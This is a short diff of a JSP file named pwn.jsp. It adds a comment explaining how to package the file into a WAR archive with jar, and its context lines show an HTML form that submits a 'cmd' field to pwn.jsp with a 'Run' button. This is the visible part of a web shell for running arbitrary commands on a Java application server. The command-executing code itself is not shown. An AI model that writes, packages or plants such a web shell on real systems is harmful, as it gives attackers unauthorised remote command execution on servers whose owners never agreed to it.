@@ -1,3 +1,4 @@
+<%--jar -cvf pwn.war pwn.jsp to compile to a warfile--%>
 <FORM METHOD=GET ACTION='pwn.jsp'>
 <INPUT name='cmd' type=text>
 <INPUT type=submit value='Run'>
